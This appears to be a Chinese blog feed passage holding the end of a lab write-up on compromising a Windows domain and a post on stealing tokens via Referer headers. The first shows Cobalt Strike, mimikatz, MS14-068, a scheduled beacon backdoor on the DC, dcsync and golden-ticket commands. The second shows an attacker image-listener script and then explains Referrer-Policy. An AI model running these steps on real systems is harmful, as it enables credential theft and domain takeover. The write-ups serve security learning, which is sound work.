src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204952134.png" alt="image-20250512204952134"></p><h4 id="获取hash和域内信任主机">获取hash和域内信任主机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">net view</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205228670.png" alt="image-20250512205228670"></p><h4 id="扫描环境内主机">扫描环境内主机</h4><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512205837345.png" alt="image-20250512205837345"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210232067.png" alt="image-20250512210232067"></p><p>扫描结果如下，存在主机<code>10.10.10.149</code>。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512210509148.png" alt="image-20250512210509148"></p><h4 id="利用cs集成命令进行信息收集">利用cs集成命令进行信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net computers</span><br><span class="line">net domain</span><br><span class="line">net dclist</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211214829.png" alt="image-20250512211214829"></p><h4 id="cs-mimikatz-web服务获取明文">cs mimikatz web服务获取明文</h4><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512211552406.png" alt="image-20250512211552406"></p><h4 id="dir访问域控DC">dir访问域控DC</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell \\dc\c$</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512212553216.png" alt="image-20250512212553216"></p><h4 id="cs-ms14-068提权到域控">cs ms14-068提权到域控</h4><p>上传文件<code>ms14-068</code>到<code>web</code>服务器上，执行如下命令，<code>SID</code>来源前面<code>MSF</code>获取的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514000630970.png" alt="image-20250514000630970"></p><h5 id="在ms14-068-py脚本下创建票据">在ms14-068.py脚本下创建票据</h5><p>还可以使用<code>ms14-068.py</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>进行票据的创建。这里<code>mac</code>用户有一个坑点，执行时候要使用到<code>python2</code>，我的<code>proxychains-ng</code>编译成了<code>arm64</code>格式，但是<code>ms14-068.py</code>使用的执行环境是<code>python2</code>，<code>python2</code>是<code>x86</code>的，二者冲突了。难搞☹️。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514102745723.png" alt="image-20250514102745723"></p><p>这里如果使用<code>kali</code>应该是没问题的，使用下面的命令直接就可以了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python2 ms14-068.py -u web@hackbox.com -s S-1-5-21-2005268815-6584D69957-1189185684-1103 -d 10.10.10.149 -p &#x27;!@#@we456&#x27;</span><br></pre></td></tr></table></figure><h5 id="KrbCredExport-将-ccache-文件转化为-kirbi-格式"><strong>KrbCredExport</strong> 将 <strong>.ccache</strong> 文件转化为 <strong>kirbi</strong> 格式</h5><p>使用前面<code>MS14-068.exe</code>获取的<code>TGT_web@hackbox.com.ccache</code>，使用<code>KrbCredExport.py</code><sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>将其转化为<code>user.ticket</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python KrbCredExport.py ./ccaches/TGT_web@hackbox.com.ccache ./tickets/user.ticket</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514103702160.png" alt="image-20250514103702160"></p><h5 id="导入票据访问dc">导入票据访问dc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use ./tickets/user.ticket</span><br><span class="line">shell dir \\dc\c$</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105022907.png" alt="image-20250514105022907"></p><h4 id="获取dc域控权限">获取dc域控权限</h4><p>目前是有了访问<code>dc</code>的权限，下面尝试获取<code>dc</code>域控的控制权限。</p><h5 id="设置smb连接器，进行正向连接">设置smb连接器，进行正向连接</h5><p>创建一个连接器。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514105827103.png" alt="image-20250514105827103"></p><p>生成<code>exe</code>，并上传到域控上。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514110655360.png" alt="image-20250514110655360"></p><h5 id="复制后门文件到域控中并执行">复制后门文件到域控中并执行</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy beacon.exe \\dc\c$\beacon.exe</span><br><span class="line">shell net time \\dc</span><br><span class="line">shell at \\dc 11:49:00 c:/beacon.exe</span><br></pre></td></tr></table></figure><p>添加定时任务。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115225164.png" alt="image-20250514115225164"></p><h5 id="在beacon正向连接上dc">在beacon正向连接上dc</h5><p><code>link dc</code>连接上<code>dc</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115403150.png" alt="image-20250514115403150"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115454588.png" alt="image-20250514115454588"></p><h4 id="获取dc明文哈希">获取dc明文哈希</h4><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115901753.png" alt="image-20250514115901753"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514115954384.png" alt="image-20250514115954384"></p><h4 id="cs制作黄金票据">cs制作黄金票据</h4><h5 id="在域控上执行命令导出krbtgt信息">在域控上执行命令导出krbtgt信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">dcsync hackbox.com hackbox\krbtgt</span></span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514120300664.png" alt="image-20250514120300664"></p><p>获取数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域:hackbox.com</span><br><span class="line">krbtgt的NTLM哈希值为:6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">域的SID（普通用户的SID除去最后三位就是域的SID）:S-1-5-21-2005268815-658469957-1189185684</span><br></pre></td></tr></table></figure><h5 id="在web服务器上制作黄金票据">在web服务器上制作黄金票据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:x2ntest1 /domain:hackbox.com /sid:S-1-5-21-2005268815-658469957-1189185684 /krbtgt:6f60ace6accbcb76078ccc0312174e98 /endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514121400389.png" alt="image-20250514121400389"></p><p>未使用票据前，访问失败。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122841610.png" alt="image-20250514122841610"></p><p>使用黄金票据后，可以直接访问域控了。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123111483.png" alt="image-20250514123111483"></p><h2 id="FLAG获取">FLAG获取</h2><h3 id="Web-flag1">Web flag1</h3><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122330806.png" alt="image-20250514122330806"></p><h3 id="Web-flag2">Web flag2</h3><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514122516477.png" alt="image-20250514122516477"></p><h3 id="DC-flag3">DC flag3</h3><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250514123200938.png" alt="image-20250514123200938"></p><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://www.cnblogs.com/baicaix86/p/16418840.html">https://www.cnblogs.com/baicaix86/p/16418840.html</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p><a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域控 </tag>
            
            <tag> 黄金票据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据包referrer头中敏感信息的窃取</title>
      <link href="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/"/>
      <url>/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>在我们日常漏洞挖掘的过程中，可能会碰见数据包中的<code>referer</code>带有一些信息的情况，如<code>token</code>、<code>sessionid</code>,<code>key</code>和<code>phoneNumber</code>等，对于这些信息，我们如何去窃取呢？这里可以使用<code>img</code>标签去进行信息的窃取。</p><p><strong>场景如下：</strong></p><p><code>A</code>为<code>url</code>，其值为<code>https://test.com/index.html?token=xxxxxx</code>，当我们访问<code>A</code>时进入到的页面为<code>B</code>，<code>B</code>的<code>html</code>中有一个<code>&lt;img&gt;</code>标签，这个标签的<code>src</code>属性是我们可以随意控制的，且这个<code>B</code>页面启用了<code>unsafe-url</code>。</p><p>默认情况下，<code>unsafe-url</code>是不启用的，不启用时默认<code>referer</code>的内容为<strong>协议、主机名和端口</strong>，不携带参数，这是<code>Referrer Policy</code>，后面我会提到。</p><p><strong>真实环境场景：</strong></p><p>一切<code>&lt;img&gt;</code>标签的<code>src</code>属性可控的点都有可能。</p><p>例如：</p><ul><li>论坛站点，用户的头像<code>url</code>可控，对应于<code>img</code>中的<code>src</code>可控。</li><li>视频播放站点，存在评论区，用户头像<code>url</code>可控。</li></ul><h2 id="攻击场景演示">攻击场景演示</h2><blockquote><p>攻击效果： 受害者会带着自己的<code>token</code>，就是这里的<code>A</code>，访问到页面<code>B</code>，<code>B</code>中的<code>img</code>标签的<code>src</code>属性我们可控，设置为攻击者监听数据包的脚本，监听的数据包中包含有敏感信息的<code>referer</code>，进而实现信息的窃取。</p></blockquote><p>下面来演示一下敏感信息的窃取。</p><ul><li><code>A</code>为<code>URL</code>：<code>http://127.0.0.1:3000/index.html?token=xxxxxx</code></li><li><code>B</code>为这个<code>index.html</code>页面，其中<code>img</code>标签的<code>src</code>属性我们可控，其页面启用了<code>unsafe-url</code>。</li></ul><p><code>B</code>的<code>index.html</code>页面如下，其中的<code>http://127.0.0.1:3001/logo.png</code>为攻击者嵌入的监听数据包脚本。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;unsafe-url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Logo Picture<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:3001/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo Picture&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个<code>http://127.0.0.1:3001/logo.png</code>的后端<code>nodejs</code>脚本<code>main.js</code>如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hostname = <span class="string">&#x27;0.0.0.0&#x27;</span>; <span class="comment">// 监听所有可用的网络接口</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3001</span>; <span class="comment">// 您希望服务器监听的端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> parsedUrl = url.<span class="title function_">parse</span>(req.<span class="property">url</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> pathname = parsedUrl.<span class="property">pathname</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pathname === <span class="string">&#x27;/logo.png&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;-------------------- 请求详情 --------------------&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`请求方法: <span class="subst">$&#123;req.method&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`请求 URL: <span class="subst">$&#123;req.url&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;请求头:&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">headers</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--------------------------------------------------&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;image/png&#x27;</span> &#125;);</span><br><span class="line">    <span class="comment">// 在这里您可以实际读取并返回一个 logo.png 文件</span></span><br><span class="line">    <span class="comment">// 为了演示，我们发送一个简单的透明像素 GIF</span></span><br><span class="line">    <span class="keyword">const</span> transparentPixel = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(transparentPixel);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Not Found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(port, hostname, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`请访问 http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/logo.png 查看请求详情。`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>攻击者在自己的<code>vps</code>上运行脚本<code>main.js</code>，受害者访问到的页面为<code>http://127.0.0.1:3000/index.html</code>。</p><p>本地使用<code>python</code>启动一个<code>HTTP</code>服务，模拟受害者访问的页面。</p><p>在<code>index.html</code>同目录下执行命令<code>python -m http.server 3000</code>，此时攻击者<code>node main.js</code>启动监听脚本。</p><p>此时受害者访问到<code>A</code>，受害者的<code>token</code>成功被攻击者窃取。</p><p><img src="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/image-20250506143443451.png" alt="image-20250506143443451"></p><p>再来看一下不启用<code>unsafe-url</code>的情况。</p><p>修改<code>index.html</code>为<code>index2.html</code>如下，切换为默认情况。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;meta name=&quot;referrer&quot; content=&quot;unsafe-url&quot;&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Logo Picture<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:3001/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo Picture&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时访问<code>http://localhost:3000/index2.html?token=xxxxx</code>，这里发现<code>referer</code>中的<code>token</code>就会消失了。此处测试使用的浏览器为Chrome 135.0.7049.115（正式版本） (arm64)。出现这种情况是由于<code>referrer-policy</code>的关系。</p><p><img src="/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/image-20250506144151403.png" alt="image-20250506144151403"></p><h2 id="Referrer-policy">Referrer-policy</h2><p>介绍一下 <code>referrer-policy</code>。它是一个 HTTP 头部，用于控制在用户导航到其他网页时，浏览器在 HTTP 请求的 <code>Referer</code> 头部中发送哪些信息。<code>Referer</code> 头部包含了前一个页面的 URL，这对于分析用户来源、安全性和内容定制等方面非常有用。然而，出于隐私和安全考虑，开发者可能需要限制甚至完全阻止 <code>Referer</code> 信息的发送。<code>referrer-policy</code> 就是为了实现这种控制而生的。</p><p><strong>为什么需要 <code>referrer-policy</code>？</strong></p><ul><li><strong>隐私保护:</strong> 有些页面的 URL 可能包含用户的敏感信息（例如，会话 ID、用户名等）。不加限制地发送 <code>Referer</code> 可能会泄露这些信息给第三方网站。</li><li><strong>安全性:</strong> 恶意网站可能会利用 <code>Referer</code> 信息进行某些攻击，例如跨站请求伪造（CSRF）的变种。</li><li><strong>数据分析的精细化控制:</strong> 开发者可能希望更精确地控制哪些来源信息可以被分析工具收集。</li></ul><h3 id="referrer-policy-的取值"><code>referrer-policy</code> 的取值</h3><p><code>referrer-policy</code> 头部可以设置多个不同的值，这些值定义了在不同场景下 <code>Referer</code> 头部应该如何发送。</p><p>以下是一些常见的取值及其含义：</p><ul><li><strong><code>no-referrer</code>:</strong> 这是最严格的策略。无论在任何情况下，都不会发送 <code>Referer</code> 头部。</li><li><strong><code>no-referrer-when-downgrade</code>:</strong> 这是默认策略。只有在从 <code>HTTPS</code> 页面导航到 <code>HTTP</code> 页面时，才会不发送 <code>Referer</code> 头部。在其他情况下（例如，<code>HTTPS</code> 到 <code>HTTPS</code>，<code>HTTP</code> 到 <code>HTTP</code>，<code>HTTP</code> 到 <code>HTTPS</code>），会发送完整的来源 <code>URL</code>。这个策略旨在防止 <code>HTTPS</code> 页面上的敏感信息通过不安全的 <code>HTTP</code> 连接泄露。</li><li><strong><code>same-origin</code>:</strong> 只有当目标网站与当前网站具有相同的源（协议、域名和端口都相同）时，才会发送完整的 <code>Referer</code> 头部。对于跨域请求，不会发送 <code>Referer</code> 头部。</li><li><strong><code>origin</code>:</strong> 在任何情况下，都会发送来源的协议和主机名（不包含路径和查询字符串）。例如，如果当前页面是 <code>https://example.com/page.html</code>，那么 <code>Referer</code> 头部的值将是 <code>https://example.com/</code>。</li><li><strong><code>strict-origin</code>:</strong> 与 <code>origin</code> 类似，但在从 HTTPS 页面导航到 HTTP 页面时，不会发送 <code>Referer</code> 头部。</li><li><strong><code>origin-when-cross-origin</code>:</strong> 对于同源请求，发送完整的 <code>Referer</code> 头部。对于跨域请求，只发送来源的协议和主机名。</li><li><strong><code>strict-origin-when-cross-origin</code>:</strong> 对于同源请求，发送完整的 <code>Referer</code> 头部。对于跨域请求，只发送来源的协议和主机名。并且在从 HTTPS 页面导航到 HTTP 页面时，不会发送 <code>Referer</code> 头部。</li><li><strong><code>unsafe-url</code>:</strong> 这是最宽松的策略。无论在任何情况下，都会发送完整的 <code>Referer</code> 头部，包括协议、主机名、路径和查询字符串。<strong>强烈建议避免使用此策略</strong>，因为它可能会暴露敏感信息。</li></ul><h3 id="如何设置-referrer-policy？">如何设置 <code>referrer-policy</code>？</h3><p>设置 <code>referrer-policy</code> 有几种方式：</p><ol><li><strong>HTTP 头部:</strong> 这是最常用和推荐的方式。服务器在 HTTP 响应头中添加 <code>Referrer-Policy</code> 字段并设置相应的值。例如：</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referrer-Policy</span><span class="punctuation">: </span>strict-origin-when-cross-origin</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>HTML <code>&lt;meta&gt;</code> 标签:</strong> 在 HTML 文档的 